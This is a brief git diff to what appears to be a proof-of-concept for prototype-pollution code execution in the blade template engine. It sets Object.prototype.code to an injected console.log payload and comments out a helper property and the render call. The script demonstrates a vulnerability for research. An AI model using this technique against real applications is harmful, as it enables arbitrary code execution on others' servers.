@@ -6,7 +6,8 @@ const blade = require('blade');
 
 
 Object.prototype.code = "console.log('RCE!')"
-Object.prototype.value = "somevalue" // helper property, bladejs/lib/parser/index.js::1316
+// Object.prototype.value = "somevalue" // helper property, bladejs/lib/parser/index.js::1316
+
 
 const template = `html
     head
@@ -21,7 +22,8 @@ const template = `html
             h1 Blade is cool`;
 
 blade.compile(template, {'debug': true}, function(err, tmpl) {
-    tmpl({'nav': []}, function(err, html) {
-        console.log(html, err);
-    });
+    // console.log(err);
+    // tmpl({'nav': []}, function(err, html) {
+    //     console.log(html, err);
+    // });
 });
